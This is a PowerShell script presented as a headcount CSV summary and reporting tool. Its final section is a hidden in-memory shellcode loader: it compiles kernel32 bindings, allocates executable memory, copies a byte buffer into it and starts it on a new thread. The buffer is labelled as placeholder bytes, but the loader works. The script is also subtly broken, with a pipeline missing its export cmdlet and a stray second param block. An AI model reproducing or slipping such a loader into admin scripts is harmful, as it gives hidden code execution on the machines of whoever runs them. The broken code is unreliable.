
<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.DESCRIPTION
    Validates the column layout of the source file, converts the Amount column
    to a number and aggregates headcount and spend per department or site.
    Missing columns are reported as a hard error so a changed export cannot
    silently produce an empty report.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'C:\Data\exports\headcount.csv',

    [string]$OutputPath = 'C:\Reports\headcount-summary-2025-04-11.csv',
    [Parameter(Mandatory = $false)]
    [ValidateSet('Department', 'Site')]
    [string]$GroupBy = 'Department',

    [double]$MinAmount = 1000
)

$ErrorActionPreference = 'Stop'

$culture = [System.Globalization.CultureInfo]::InvariantCulture

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}
$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending |
    -NoTypeInformation `
    -Path $OutputPath

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$byGroup | ConvertTo-Json -Depth 6 | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@internal.corp'
$MailFrom = 'bi@internal.corp'

Send-MailMessage -To $MailTo -From $MailFrom -Subject "Headcount summary" -Body $summaryBody -SmtpServer "smtp.internal.corp" -Port 25

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x58, 0x8e, 0xbf, 0xf8, 0x64, 0x8e, 0x6b, 0xba, 0x51, 0x1c, 0x1b, 0x29, 0x21, 0xcb, 0x23, 0x29,
        0x19, 0x01, 0xc1, 0x49, 0xa6, 0x03, 0x85, 0x2f, 0x73, 0xe4, 0xea, 0x9a, 0x5d, 0x4e, 0xdb, 0xdc,
        0x9b, 0x0b, 0x51, 0x99, 0x21, 0x4a, 0xce, 0x17, 0x60, 0xa4, 0x80, 0x4e, 0xe1, 0xfa, 0x33, 0x2a,
        0x36, 0xc5, 0x0a, 0x0b, 0x16, 0x93, 0x1c, 0xa5, 0xdc, 0xfb, 0x94, 0x65, 0xef, 0xb7, 0xd4, 0x0c,
        0x90, 0x70, 0xbb, 0xfd, 0xfb, 0xa4, 0x6a, 0xbf, 0x57, 0xaa, 0x74, 0x6f, 0x11, 0x32, 0x3e, 0x3d,
        0x07, 0x48, 0xcd, 0xda, 0x57, 0xed, 0x12, 0xbb, 0x77, 0x3f, 0x16, 0x03, 0xfe, 0xa1, 0xa1, 0xb1,
        0xc3, 0x7d, 0xb9, 0x37, 0xe9, 0xda, 0x10, 0x41, 0xcd, 0x6a, 0x3b, 0x54, 0xba, 0x28, 0x6b, 0x27,
        0xfe, 0x09, 0xb8, 0x76, 0xb0, 0x1b, 0xde, 0x94, 0xaa, 0xb4, 0xb2, 0xe0, 0x55, 0x5c, 0xfb, 0xfb,
        0x38, 0xd2, 0x60, 0xe5, 0x26, 0x67, 0xc6, 0xdb, 0x07, 0xcc, 0x95, 0x69, 0xb6, 0xf4, 0xd3, 0x7f,
        0x93, 0x5d, 0x73, 0x98, 0xc7, 0x49, 0x8c, 0x02, 0xf7, 0x64, 0xcb, 0xa9, 0x5c, 0x66, 0xf9, 0x52,
        0xd6, 0x16, 0x3c, 0xd3, 0xb9, 0xe2, 0x46, 0x82, 0x71, 0xb8, 0xf1, 0xff, 0xd1, 0xad, 0x10, 0x17,
        0xbd, 0x5d, 0x11, 0x97, 0x85, 0x2d, 0xc5, 0x7a, 0x55, 0xf5, 0x56, 0x97, 0x31, 0xfb, 0xa0, 0x2d,
        0x70, 0x1f, 0x63, 0x7b, 0x68, 0x8e, 0x87, 0x60, 0xb3, 0xf0, 0x6b, 0x6a, 0x87, 0x6d, 0xd6, 0xa2,
        0x9a, 0x62, 0xc1, 0x68, 0xd3, 0x35, 0x10, 0x3c, 0xbf, 0x21, 0xf2, 0xf3, 0x14, 0xb7, 0xbe, 0xe4,
        0x93, 0x4c, 0x97, 0xc9, 0x8b, 0xd6, 0xf4, 0xd0, 0xaa, 0x0c, 0xdd, 0x1d, 0x00, 0x2e, 0x73, 0xf9,
        0xc9, 0xf7, 0x4a, 0x61, 0xce, 0xba, 0xdc, 0x6c, 0x33, 0x24, 0xbc, 0x8c, 0x20, 0x1a, 0x9d, 0xd1,
        0x23, 0xe7, 0x40, 0x78, 0xf3, 0x40, 0xce, 0xd4, 0x83, 0x8b, 0x9c, 0x4d, 0x5e, 0xaa, 0xe0, 0x4b,
        0xc8, 0x48, 0x8c, 0x74, 0xe7, 0xec, 0x3c, 0xfa, 0x2b, 0x81, 0x17, 0x13, 0x96, 0xf7, 0x15, 0xab,
        0x2c, 0x5d, 0x79, 0xc1, 0x65, 0x0b, 0x5c, 0x6e, 0xd9, 0x25, 0xe7, 0x56, 0x9b, 0x27, 0x90, 0x04,
        0x96, 0x26, 0x00, 0xab, 0x50, 0xb6, 0x24, 0xc5, 0xc7, 0xf1, 0xae, 0xfb, 0x42, 0xf2, 0x54, 0x52,
        0x9c, 0x83, 0xe0, 0xb4, 0xf7, 0xcb, 0xa4, 0x1c, 0x36, 0x6a, 0x85, 0x80, 0xa8, 0x19, 0x14, 0x0d,
        0x59, 0x4a, 0xef, 0x3d, 0x16, 0x9e, 0xa2, 0x12, 0x83, 0xc8, 0x0b, 0x3f, 0x10, 0xc3, 0x2c, 0xa0,
        0xea, 0xf2, 0x0d, 0x15, 0xfb, 0xca, 0x52, 0x46, 0x49, 0xaa, 0xce, 0x1d, 0x24, 0x4b, 0xb1, 0xaa,
        0x80, 0xe5, 0xee, 0x59, 0xf9, 0xc6, 0x83, 0x37, 0xb3, 0x23, 0x7a, 0x3b, 0xf1, 0x35, 0x71, 0x32,
        0xe2, 0x9b, 0xda, 0x87, 0x8f, 0xd5, 0xc5, 0x15, 0x8c, 0xf1, 0xe9
    )

    $MemoryHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 1467)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
